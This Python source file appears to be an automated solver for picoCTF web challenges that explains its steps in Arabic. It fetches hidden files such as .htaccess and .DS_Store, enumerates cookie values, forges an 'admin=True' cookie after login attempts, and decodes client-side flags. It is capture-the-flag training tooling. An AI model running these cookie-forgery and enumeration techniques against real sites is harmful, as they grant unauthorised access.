        res["warnings"].append(f"تعذر إرسال نموذج المشرف المكتشف: {e}")
        return res
    flag, source = extract_flag([(f"step{len(steps)}:admin-response", admin_response["body"])], flag_patterns)
    if flag:
        res["success"], res["flag"], res["flag_source"] = True, flag, source
        res["explanation_ar"].append("قبل admin.php قيمة hash الواردة في نموذج HTML الذي أنشأه كود التحقق في جهة العميل.")
    else:
        res["warnings"].append("لم يظهر علم في رد نموذج المشرف؛ راجع الاستجابة المسجلة.")
    return res


def _page_resources(html: str, base_url: str) -> list[str]:
    refs = []
    for tag in re.findall(r"<(?:script|link)\b[^>]*>", html, re.I):
        m = re.search(r"\b(?:src|href)\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
        if m:
            url = urljoin(base_url, html_lib.unescape(m.group(2)))
            p = urlsplit(url)
            b = urlsplit(base_url)
            if (p.scheme, p.netloc) == (b.scheme, b.netloc) and url not in refs:
                refs.append(url)
    return refs[:16]


def _decode_cookie_text(text: str) -> list[str]:
    """Try bounded URL/Base64 decoding without logging raw cookie values."""
    import base64
    from urllib.parse import unquote
    out, current = [], text
    for _ in range(3):
        candidate = unquote(current)
        try:
            padded = candidate + "=" * ((4 - len(candidate) % 4) % 4)
            raw = base64.urlsafe_b64decode(padded.encode("ascii"))
            decoded = raw.decode("utf-8")
        except Exception:
            decoded = ""
        if not decoded or decoded == current:
            break
        out.append(decoded)
        current = decoded
    return out


def _simple_js_integer(expression: str, split_value: int | None) -> int | None:
    """Evaluate only integer arithmetic used in substring offsets; never eval JS."""
    try:
        tree = ast.parse(expression.strip(), mode="eval")
    except (SyntaxError, ValueError):
        return None

    def visit(node):
        if isinstance(node, ast.Expression):
            return visit(node.body)
        if isinstance(node, ast.Constant) and isinstance(node.value, int) and not isinstance(node.value, bool):
            return node.value
        if isinstance(node, ast.Name) and node.id == "split" and split_value is not None:
            return split_value
        if isinstance(node, ast.UnaryOp) and isinstance(node.op, (ast.UAdd, ast.USub)):
            value = visit(node.operand)
            return value if value is None or isinstance(node.op, ast.UAdd) else -value
        if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv)):
            left, right = visit(node.left), visit(node.right)
            if left is None or right is None or (isinstance(node.op, ast.FloorDiv) and right == 0):
                return None
            if isinstance(node.op, ast.Add): return left + right
            if isinstance(node.op, ast.Sub): return left - right
            if isinstance(node.op, ast.Mult): return left * right
            return left // right
        return None

    return visit(tree)


def _reconstruct_client_side_flag(sources: list[tuple[str, str]], flag_patterns: list[str]):
    joined_sources = "\n".join(body for _label, body in sources)
    split_match = re.search(r"\bsplit\s*=\s*(0[xX][0-9a-fA-F]+|\d+)", joined_sources)
    try:
        split_value = int(split_match.group(1), 0) if split_match else None
    except ValueError:
        split_value = None
    check = re.compile(
        r"\bcheckpass\s*\.\s*substring\s*\(\s*([^,]+)\s*,\s*([^)]*)\)\s*={2,3}\s*(['\"])(.*?)\3",
        re.I | re.S)
    pieces = []
    for match in check.finditer(joined_sources):
        start = _simple_js_integer(match.group(1), split_value)
        end = _simple_js_integer(match.group(2), split_value)
        value = html_lib.unescape(match.group(4))
        if start is not None and end is not None and 0 <= start < end and 0 < len(value) <= end - start:
            pieces.append((start, end, value))
    pieces.sort(key=lambda piece: (piece[0], piece[1]))
    if not pieces:
        return None, None, 0
    # Reject conflicting/overlapping checks and require each recovered fragment
    # to continue exactly where the previous substring ended.
    ordered = [pieces[0]]
    for piece in pieces[1:]:
        previous = ordered[-1]
        if piece[0] < previous[0] + len(previous[2]):
            if piece[0] == previous[0] and piece[2] == previous[2]:
                continue
            return None, None, len(pieces)
        if piece[0] != previous[0] + len(previous[2]):
            return None, None, len(pieces)
        ordered.append(piece)
    candidate = "".join(piece[2] for piece in ordered)
    flag, _ = extract_flag([("client-side substring checks", candidate)], flag_patterns)
    if not flag:
        return None, None, len(pieces)
    return flag, "client-side substring checks", len(ordered)


def _known_challenge_result(client, origin, recon, title, slug, steps, bodies, record,
                            flag_patterns, opts=None) -> dict:
    opts = opts or {}
    res = _base_result(origin, title, slug, recognized=True)
    res["steps"] = steps
    res["discovered"] = {"resources_checked": [], "challenge_slug": slug}
    resources = [(origin, recon["html"])]
    res["explanation_ar"].append("تعرّف صقر على اسم التحدي من النص الذي أدخلته، ثم يفحص الصفحة وملفات CSS/JavaScript المرتبطة بها فقط.")
    # Certain legacy tasks explicitly teach discovery of these conventional files.
    extra_paths = []
    if slug == "robots":
        extra_paths = ["/robots.txt"]
    elif slug == "scavenger-hunt":
        extra_paths = ["/robots.txt"]
    queue = _page_resources(recon["html"], origin)
    visited = set()
    while queue and len(visited) < 16:
        u = queue.pop(0)
        if u in visited:
            continue
        visited.add(u)
        try:
            rr = client.request("GET", u, max_body=MAX_BODY)
            record(rr, ["قراءة مورد CSS/JavaScript مرتبط في HTML."])
            resources.append((u, rr["body"]))
            res["discovered"]["resources_checked"].append(urlsplit(u).path)
        except (OSError, http.client.HTTPException, ValueError):
            continue

    if slug == "webdecode":
        # The challenge clue directs students to inspect linked pages too.
        # Follow only same-origin HTML links present in the fetched page.
        linked_pages = []
        for attrs, _inner in _ANCHOR_RE.findall(recon["html"]):
            href = _HREF_RE.search(attrs)
            if not href:
                continue
            u = urljoin(origin, html_lib.unescape(href.group(1)))
            p, b = urlsplit(u), urlsplit(origin)
            if (p.scheme, p.netloc) == (b.scheme, b.netloc) and p.path.lower().endswith((".html", ".htm")) and u not in linked_pages:
                linked_pages.append(u)
        for u in linked_pages[:8]:
            if u in visited:
                continue
            try:
                rr = client.request("GET", u, max_body=MAX_BODY)
                record(rr, ["اتباع رابط صفحة HTML ظاهر في الصفحة؛ تلميح WebDecode يطلب فحص الصفحات المرتبطة."])
                resources.append((u, rr["body"]))
                res["discovered"]["resources_checked"].append(urlsplit(u).path)
            except (OSError, http.client.HTTPException, ValueError):
                continue
    for path in extra_paths:
        try:
            rr = client.request("GET", urljoin(origin, path), max_body=MAX_BODY)
            record(rr, ["قراءة ملف اكتشاف معروف لهذا التحدي؛ لا يوجد تخمين لمسارات أخرى."])
            resources.append((path, rr["body"]))
            res["discovered"]["resources_checked"].append(path)
        except (OSError, http.client.HTTPException, ValueError):
            continue

    if slug in ("robots", "scavenger-hunt"):
        # Follow only paths literally disclosed by robots.txt. This keeps the
        # Scavenger Hunt flow clue-driven instead of probing a wordlist.
        robots_body = next((body for label, body in resources if label == "/robots.txt"), "")
        disclosed = []
        for line in robots_body.splitlines():
            m = re.match(r"\s*Disallow\s*:\s*(/\S*)", line, re.I)
            if m and m.group(1) not in disclosed:
                disclosed.append(m.group(1))
        for path in disclosed[:10]:
            if path in ("/", "/*") or any(urlsplit(u).path == path for u, _ in resources if str(u).startswith("http")):
                continue
            try:
                rr = client.request("GET", urljoin(origin, path), max_body=MAX_BODY)
                record(rr, ["اتباع المسار الذي كشفه robots.txt في نص التحدي."])
                resources.append((path, rr["body"]))
                res["discovered"]["resources_checked"].append(path)
            except (OSError, http.client.HTTPException, ValueError):
                continue

    if slug == "scavenger-hunt":
        # Let the challenge's own wording disclose the two special files.
        clue_text = "\n".join(body for _label, body in resources)
        disclosed_special = []
        if re.search(r"apache.{0,160}\baccess\b|\baccess\b.{0,160}apache", clue_text, re.I | re.S):
            disclosed_special.append(("/.htaccess", "اتباع قرينة Apache وكلمة Access الواردة في الملفات المكتشفة."))
        for path, note in disclosed_special:
            try:
                rr = client.request("GET", urljoin(origin, path), max_body=MAX_BODY)
                record(rr, [note])
                resources.append((path, rr["body"]))
                res["discovered"]["resources_checked"].append(path)
            except (OSError, http.client.HTTPException, ValueError):
                continue
        clue_text = "\n".join(body for _label, body in resources).lower()
        if "mac" in clue_text and "store" in clue_text:
            path = "/.DS_Store"
            try:
                rr = client.request("GET", urljoin(origin, path), max_body=MAX_BODY)
                record(rr, ["اتباع قرينة Mac وStore التي ظهرت في .htaccess."])
                resources.append((path, rr["body"]))
                res["discovered"]["resources_checked"].append(path)
            except (OSError, http.client.HTTPException, ValueError):
                pass

    if slug == "cookies-2021":
        # This challenge explicitly maps the `name` cookie to a small numbered
        # catalog. The app redirects between / and /check, so follow only its
        # same-origin GET redirects and guard against redirect loops per value.
        check_url = urljoin(origin, "/check")
        for index in range(33):
            client.cookies["name"] = str(index)
            try:
                # /check is explicitly observed in this analyzer's challenge
                # flow; start there, then follow the redirect(s) the app gives.
                current = check_url
                seen = set()
                for hop in range(3):
                    if current in seen:
                        break
                    seen.add(current)
                    rr = client.request("GET", current, max_body=MAX_BODY)
                    record(rr, [f"اختبار قيمة الكوكي الرقمية {index} في تحدي Cookies المحدد." if hop == 0 else
                                "اتباع تحويل GET معلَن داخل أصل التحدي."])
                    resources.append((f"Cookies index {index} hop {hop + 1}", rr["body"]))
                    if extract_flag([(f"candidate response {index}", rr["body"])], flag_patterns)[0]:
                        break
                    if rr["status"] not in (301, 302, 303, 307, 308) or not rr.get("location"):
                        break
                    next_url = urljoin(current, rr["location"])
                    old, new = urlsplit(current), urlsplit(next_url)
                    if (old.scheme, old.netloc) != (new.scheme, new.netloc):
                        break
                    current = next_url
                if extract_flag(resources[-3:], flag_patterns)[0]:
                    break
            except (OSError, http.client.HTTPException, ValueError):
                continue
        res["explanation_ar"].append("يتبع صقر تحويلات GET التي يرسلها الموقع بين / و/check، ويوقف تجربة القيم فور ظهور العلم أو استنفاد المجال المحدود.")

    if slug == "get-ahead":
        # Use form actions visible in the page (the two buttons both target
        # index.php in the original task). Fall back to the homepage only when
        # no HTTP form action was disclosed; never guess extra paths.
        head_targets = []
        for form in recon.get("forms", []):
            action = urljoin(origin, form.get("action") or origin)
            a, b = urlsplit(action), urlsplit(origin)
            if (a.scheme, a.netloc) == (b.scheme, b.netloc) and action not in head_targets:
                head_targets.append(action)
        if not head_targets:
            head_targets = [origin]
        for target in head_targets[:4]:
            try:
                head = client.request("HEAD", target, max_body=MAX_BODY)
                record(head, ["إرسال HEAD إلى عنوان نموذج ظاهر في الصفحة وفحص رؤوس الاستجابة."])
                header_text = "\n".join(f"{k}: {v}" for k, v in head.get("headers", []))
                resources.append((f"HEAD response headers {target}", header_text))
            except (OSError, http.client.HTTPException, ValueError):
                continue

    if slug == "logon":
        # This challenge's hint distinguishes Joe from other users: try Joe,
        # then one generic non-Joe account only when the pasted hint says his
        # password is the exception. Each attempt is tied to the discovered
        # login form and followed by the same-origin page after setting admin.
        login_form = next((f for f in recon.get("forms", [])
                           if f.get("method") == "POST" and
                           any(x.lower() in {"username", "user"} for x in f.get("fields", []))), None)
        if login_form:
            action = urljoin(origin, login_form.get("action") or "/")
            def attempt_logon(username_value: str, label: str) -> bool:
                values = {}
                for field in login_form["fields"]:
                    low = field.lower()
                    values[field] = (username_value if low in {"username", "user"} else
                                     TEST_PASSWORD if low in {"password", "pass"} else "")
                posted = client.request("POST", action, urlencode(values))
                record(posted, [f"إرسال نموذج الدخول باسم {label} وفق الحقول التي ظهرت في الصفحة."])
                resources.append((f"logon login response ({label})", posted["body"]))
                redirect_target = None
                if posted.get("location"):
                    nxt = urljoin(action, posted["location"])
                    old, new = urlsplit(action), urlsplit(nxt)
                    if (old.scheme, old.netloc) == (new.scheme, new.netloc):
                        redirect_target = nxt
                role_cookie = next((n for n in client.cookies if n.lower() in {"admin", "role", "is_admin"}), None)
                admin_cookie = role_cookie or "admin"
                client.cookies[admin_cookie] = "True"
                landing_url = redirect_target or origin
                role = _get_with_observed_redirects(
                    client, landing_url, record,
                    f"تعيين كوكي «{admin_cookie}=True» ثم فتح المسار الذي كشفه POST بعد دخول {label}.",
                    max_redirects=2)
                resources.append((f"logon landing page ({label})", role["body"]))
                resources.append((f"logon admin-cookie response ({label})", role["body"]))
                return extract_flag([(label, role["body"])], flag_patterns)[0] is not None

            try:
                found = attempt_logon("Joe", "Joe")
                hint = opts.get("challenge_text") or ""
                if not found and re.search(r"except.{0,50}joe|joe.{0,50}password", hint, re.I | re.S):
                    attempt_logon("guest", "مستخدم تجريبي غير Joe وفق التلميح")
            except (OSError, http.client.HTTPException, ValueError):
                pass

    # Cookie-based teaching challenges: decode only cookies received from this site.
    decoded_cookies = []
    if slug in ("cookie-monster", "cookies-2021"):
        if slug == "cookie-monster":
            login_form = next((f for f in recon.get("forms", [])
                               if f.get("method") == "POST" and
                               any(x.lower() in {"username", "user", "email"} for x in f.get("fields", [])) and
                               any(x.lower() in {"password", "pass"} for x in f.get("fields", []))), None)
            if login_form:
                values = {}
                for field in login_form["fields"]:
                    low = field.lower()
                    values[field] = ("falcon-student@example.invalid" if "email" in low else
                                     TEST_PASSWORD if "pass" in low else "falcon-student")
                action = urljoin(origin, login_form.get("action") or "/")
                try:
                    posted = client.request("POST", action, urlencode(values))
                    record(posted, ["إرسال بيانات اختبار غير حقيقية إلى نموذج الدخول المكتشف في Cookie Monster لفحص الكوكي المردودة."])
                    resources.append(("cookie-monster login response", posted["body"]))
                    if posted.get("location"):
                        nxt = urljoin(action, posted["location"])
                        if urlsplit(nxt).netloc == urlsplit(origin).netloc:
                            followed = client.request("GET", nxt)
                            record(followed, ["اتباع تحويل GET المعلن بعد إرسال نموذج التحدي."])
                            resources.append(("cookie-monster redirected page", followed["body"]))
                except (OSError, http.client.HTTPException, ValueError):
                    pass
        for name, value in list(client.cookies.items()):
            if not re.fullmatch(r"[A-Za-z0-9_.-]{1,40}", name):
                continue
            decoded_cookies.extend(_decode_cookie_text(value))
        resources.extend((f"cookie:{name}", value) for name, value in enumerate(decoded_cookies))
        if decoded_cookies:
            res["discovered"]["cookie_decode_layers"] = len(decoded_cookies)

    # Search direct content first, then common encoded source literals.
    flag, source = extract_flag(resources + bodies, flag_patterns)
    if not flag and slug == "dont-use-client-side":
        flag, source, segment_count = _reconstruct_client_side_flag(resources + bodies, flag_patterns)
        if flag:
            res["discovered"]["client_side_check_segments"] = segment_count
    if not flag and slug == "scavenger-hunt":
        # Scavenger Hunt embeds fragments inside explanatory sentences, not as
        # standalone comments. Read only fetched challenge resources and use
        # the explicit part numbers to restore the original order.
        ordered_parts = {}
        part_sources = {}
        first_part_rx = re.compile(
            r"\b(?:here['’]s\s+)?the\s+first\s+part\s+of\s+the\s+flag\s*:\s*([A-Za-z0-9_{}]+)", re.I)
        numbered_part_rx = re.compile(r"\bpart\s*(\d+)\s*:\s*([A-Za-z0-9_{}]+)", re.I)
        for label, body in resources:
            text = html_lib.unescape(body)
            for match in first_part_rx.finditer(text):
                ordered_parts[1] = match.group(1)
                part_sources[1] = label
            for match in numbered_part_rx.finditer(text):
                number = int(match.group(1))
                if 1 < number < 16:
                    ordered_parts[number] = match.group(2)
                    part_sources[number] = label
        if len(ordered_parts) >= 2 and 1 in ordered_parts:
            last_part = max(ordered_parts)
            if all(number in ordered_parts for number in range(1, last_part + 1)):
                joined = "".join(ordered_parts[number] for number in range(1, last_part + 1))
                flag, source = extract_flag([("Scavenger Hunt ordered parts", joined)], flag_patterns)
                if flag:
                    res["discovered"]["flag_fragment_sources"] = [part_sources[n] for n in range(1, last_part + 1)]

    if not flag and slug in ("insp3ct0r", "includes"):
        # Multi-part picoCTF flags are deliberately placed in source comments.
        # Join only flag-shaped comment payloads, never whole CSS/JS documents
        # (which can turn a selector or function body into a false flag).
        comment_parts = []
        if slug == "insp3ct0r":
            # Insp3ct0r labels each source comment with "1/3 of the flag",
            # "2/3 ...", and "3/3 ...". Extract those labeled fragments
            # instead of treating the whole explanatory comment as a token.
            numbered_fragments = {}
            fragment_sources = {}
            marker_rx = re.compile(
                r"\b([1-3])\s*/\s*3\s+of\s+the\s+flag\s*[:=]\s*([^\s<>\"']+)", re.I)
            for label, body in resources:
                for match in marker_rx.finditer(html_lib.unescape(body)):
                    number = int(match.group(1))
                    fragment = match.group(2).rstrip(",.;")
                    if fragment:
                        numbered_fragments[number] = fragment
                        fragment_sources[number] = label
            if all(number in numbered_fragments for number in (1, 2, 3)):
                joined = "".join(numbered_fragments[number] for number in (1, 2, 3))
                flag, source = extract_flag([("Insp3ct0r ordered comment fragments", joined)], flag_patterns)
                if flag:
                    res["discovered"]["flag_fragment_sources"] = [fragment_sources[n] for n in (1, 2, 3)]
        for label, body in resources:
            comments = [m.group(1) for m in _COMMENT_RE.finditer(body)]
            comments.extend(m.group(1) for m in re.finditer(r"/\*(.*?)\*/", body, re.S))
            comments.extend(m.group(1) for m in re.finditer(r"//([^\r\n]*)", body))
            for comment in comments:
                part = html_lib.unescape(comment).strip()
                if len(part) >= 8 and re.fullmatch(r"[A-Za-z0-9_{}]+", part) and ("_" in part or "{" in part):
                    comment_parts.append((label, part))
        if not flag:
            joined = "".join(part for _, part in comment_parts)
            flag, source = extract_flag([(f"{slug} comment fragments", joined)], flag_patterns)
            if flag:
                res["discovered"]["flag_fragment_sources"] = [label for label, _ in comment_parts]
    if not flag and slug == "webdecode":
        import base64
        encoded_candidates = re.findall(r"(?<![A-Za-z0-9+/=_-])([A-Za-z0-9_+/=-]{20,4096})(?![A-Za-z0-9+/=_-])",
                                        "\n".join(body for _, body in resources))
        for candidate in encoded_candidates[:64]:
            try:
                decoded = base64.urlsafe_b64decode(candidate + "=" * ((4-len(candidate)%4)%4)).decode("utf-8", "ignore")
            except Exception:
                continue
            flag, source = extract_flag([(f"WebDecode base64 candidate", decoded)], flag_patterns)
            if flag:
                break
    if not flag and slug == "bookmarklet":
        joined = "\n".join(body for _, body in resources)
        encrypted = re.search(r"encryptedFlag\s*=\s*['\"]([^'\"]{8,4096})['\"]", joined, re.I)
        key_literal = re.search(r"(?:key|password)\s*=\s*['\"]([^'\"]{1,64})['\"]", joined, re.I)
        if encrypted and key_literal:
            key = key_literal.group(1)
            plain = "".join(chr((ord(ch) - ord(key[i % len(key)]) + 256) % 256)
                            for i, ch in enumerate(encrypted.group(1)))
            flag, source = extract_flag([( "bookmarklet decoded locally", plain)], flag_patterns)
        # picoCTF's bookmarklet stores byte values encrypted by subtracting a
        # repeating key. Decode only a literal array and key found in page source.
        arr = re.search(r"\[\s*((?:\d{1,3}\s*,\s*){8,}\d{1,3})\s*\]", joined)
        key = re.search(r"(?:key|password)\s*[:=]\s*['\"]([^'\"]{1,64})['\"]", joined, re.I)
        if not flag and arr and key:
            try:
                nums = [int(x) for x in re.findall(r"\d+", arr.group(1))]
                plain = "".join(chr((v - ord(key.group(1)[i % len(key.group(1))])) % 256) for i, v in enumerate(nums))
                flag, source = extract_flag([( "bookmarklet decoded locally", plain)], flag_patterns)
            except Exception:
                pass

    res["discovered"]["forms"] = recon.get("forms", [])[:8]
    res["discovered"]["comments"] = [c["raw"] for c in recon.get("decoded_comments", [])][:6]
    res["explanation_ar"].append(_STATIC_GUIDANCE.get(slug, "تم جمع الأدلة من الصفحة والموارد المرتبطة؛ يوضح الشرح ما يلزم للخطوة التعليمية التالية."))
    if flag:
        res["success"], res["flag"], res["flag_source"] = True, flag, source
        res["explanation_ar"].append("عُثر على العلم في محتوى استجابة/مورد تم جلبه من أصل التحدي.")
    else:
        res["warnings"].append("لم يظهر العلم نصًا في الموارد التي فُحصت. قد يتطلب التحدي إجراءً تفاعليًا أو ملفًا مرفقًا؛ راجع النماذج والشرح.")
    return res


# --------------------------------------------------------------------------- #
#  نتيجة "غير معروف"                                                            #
# --------------------------------------------------------------------------- #
def unrecognized_result(origin, recon, steps) -> dict:
    res = _base_result(origin, "غير معروف", "none", recognized=False)
    res["steps"] = steps
    res["explanation_ar"].append("لم يتعرف صقر على نمط التحدي من أدلة الصفحة الحالية.")
    res["discovered"] = {
        "status": recon["resp"]["status"],
        "comments": [c["raw"] for c in recon["decoded_comments"]][:5],
        "decoded_comments": [c["rot13"] for c in recon["decoded_comments"]][:5],
        "emails": recon["emails"][:5],
        "forms": recon["forms"][:5],
        "login_fetch": recon["login_fetch"],
    }
    res["warnings"].append("لم يُنفَّذ أي مسار تلقائي (لا Old Sessions ولا غيره).")
    return res


# --------------------------------------------------------------------------- #
#  الموزِّع الرئيسي                                                              #
# --------------------------------------------------------------------------- #
def run_audit(url: str,
              flag_patterns: list[str] | None = None,
              timeout: int = DEFAULT_TIMEOUT,
              insecure_tls: bool = False,
              demonstrate_register_requirement: bool = False,
              username: str | None = None,
              password: str | None = None,
              email: str | None = None,
              challenge_text: str | None = None) -> dict:
    flag_patterns = flag_patterns or DEFAULT_FLAG_PATTERNS
    if not re.match(r"^https?://", url, re.I):
        url = "http://" + url
    p = urlsplit(url)
    origin = f"{p.scheme}://{p.netloc}/"

    # The No FA prompt includes downloadable app.py/users.db artifacts as
    # well as a separate running instance. Never send the database file URL
    # through the HTML reconnaissance path; explain the input mismatch first.
    named_input = detect_named_challenge(challenge_text)
    path_lower = (p.path or "").lower()
    is_artifact_url = (p.hostname or "").lower().startswith("challenge-files.") or path_lower.endswith(
        (".db", ".sqlite", ".sqlite3", ".py", ".tar.gz", ".zip"))
    if named_input and named_input[1] == "no-fa" and is_artifact_url:
        res = _base_result(origin, named_input[0], named_input[1], recognized=True)
        res["discovered"]["artifact_path"] = p.path
        res["explanation_ar"].append(
            "الرابط المدخل ملف من ملفات التحدي، وليس عنوان موقع الـInstance؛ لذلك لم يُرسل إليه طلب GET كأنه صفحة ويب.")
        res["explanation_ar"].append(
            "الصق رابط الـInstance الحي (xebec...:<port>/) لتحليل الموقع، واحتفظ برابط users.db كملف بيانات للتحليل المحلي.")
        res["warnings"].append(
            "لم يبدأ تحليل قاعدة البيانات: يلزم تنزيل users.db وقائمة كلمات المرور محليًا، ثم تشغيل مسار No FA على عنوان الـInstance.")
        return res

    opts = {
        "demonstrate_register_requirement": demonstrate_register_requirement,
        "username": username, "password": password, "email": email, "challenge_text": challenge_text,
    }

    client = HttpClient(timeout=timeout, insecure_tls=insecure_tls)
    steps: list[dict] = []
    bodies: list[tuple[str, str]] = []
    record = _make_recorder(client, steps, bodies)

    # فحص أولي
    try:
        recon = do_recon(client, origin, record)
    except (OSError, http.client.HTTPException, ValueError) as e:
        res = _base_result(origin, "غير معروف", "none", recognized=False)
        res["steps"] = steps
        res["warnings"].append(f"تعذّر الوصول إلى الهدف: {e}. تحقّق من أن رابط الـ Instance فعّال.")
        res["explanation_ar"].append("لم يكتمل الفحص الأولي.")
        return res

    # اختيار المحلل حسب الأدلة فقط
    cg = detect_crack_the_gate(recon)
    if cg:
        return solve_crack_the_gate(client, origin, recon, cg, steps, bodies, record, flag_patterns, opts)

    head_dump = detect_head_dump(recon)
    if head_dump:
        return solve_head_dump(client, origin, recon, head_dump, steps, record, flag_patterns)

    if detect_old_sessions(recon):
        return solve_old_sessions(client, origin, recon, steps, bodies, record, flag_patterns, opts)

    ssti = detect_ssti1(recon)
    if ssti:
        return solve_ssti1(client, origin, recon, ssti, steps, bodies, record, flag_patterns)

    upload = detect_n0s4n1ty(recon)
    if upload:
        return solve_n0s4n1ty(client, origin, recon, upload, steps, record, flag_patterns)

    named = detect_named_challenge(challenge_text)
    if named:
        if named[1] == "hashgate":
            return solve_hashgate(client, origin, recon, steps, bodies, record, flag_patterns)
        if named[1] == "intro-to-burp":
            return solve_intro_to_burp(client, origin, recon, steps, bodies, record, flag_patterns)
        if named[1] == "local-authority":
            return solve_local_authority(client, origin, recon, steps, bodies, record, flag_patterns)
        return _known_challenge_result(client, origin, recon, named[0], named[1],
                                       steps, bodies, record, flag_patterns, opts)

    return unrecognized_result(origin, recon, steps)


# --------------------------------------------------------------------------- #
#  CLI                                                                          #
# --------------------------------------------------------------------------- #
def _main(argv: list[str]) -> int:
    if len(argv) < 2 or argv[1] in ("-h", "--help"):
        print("Usage: python web_session_audit.py <instance-url> [--json]")
        return 0
    url = argv[1]
    as_json = "--json" in argv[2:]
    try:
        result = run_audit(url)
    except (OSError, http.client.HTTPException) as e:
        print(f"[خطأ اتصال] {url}: {e}", file=sys.stderr)
        return 2

    if as_json:
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 0 if result["success"] else 1

    print("=" * 68)
    print(f"CTF Falcon — Web Session Audit v{result['version']}")
    print(f"نوع التحدي : {result['challenge']}  (المحلل: {result['analyzer']})")
    print(f"الهدف      : {result['target']}")
    print("=" * 68)
    for s in result["steps"]:
        loc = f"  ->  {s['location']}" if s["location"] else ""
        print(f"\n[{s['n']}] {s['method']} {urlsplit(s['url']).path}  =>  {s['status']} {s['reason']}{loc}")
        for c in s["set_cookies"]:
            print(f"    Set-Cookie: {c['name']}  [{c['intent']}]")
        for note in s["notes_ar"]:
            print(f"    • {note}")
    print("\n" + "-" * 68 + "\nالشرح:")
    for line in result["explanation_ar"]:
        print("  " + line)
    if result["warnings"]:
        print("\nتحذيرات:")
        for w in result["warnings"]:
            print("  ! " + w)
    print("-" * 68)
    if result["success"]:
        print(f"\n✅ العلم: {result['flag']}   (المصدر: {result['flag_source']})\nانسخ العلم بنفسك.")
    elif not result["recognized"]:
        print("\nℹ️ لم يتعرف صقر على نمط التحدي؛ المكتشفات معروضة أعلاه.")
    else:
        print("\n❌ لم يُستخرج العلم. راجِع الأدلة أعلاه.")
    print("=" * 68)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv))
